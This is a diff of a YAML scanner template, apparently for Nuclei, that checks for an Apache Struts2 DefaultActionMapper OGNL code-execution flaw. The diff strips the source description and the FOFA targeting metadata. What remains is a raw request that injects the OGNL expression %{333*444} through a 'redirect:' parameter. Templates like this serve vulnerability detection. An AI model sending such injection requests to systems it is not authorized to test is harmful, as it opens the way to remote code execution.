@@ -3,12 +3,8 @@ info:
   name: 某管理系统Apache Struts2 DefaultActionMapper 前缀 OGNL 代码执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dq8pz2hsp4mfv94d'
+  description: ''
   tags: rce,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dq8pz2hsp4mfv94d
-    fofa: app="Struts2"
 http:
 - raw:
   - 'GET /system/rand.action?redirect:%25{333*444} HTTP/1.1
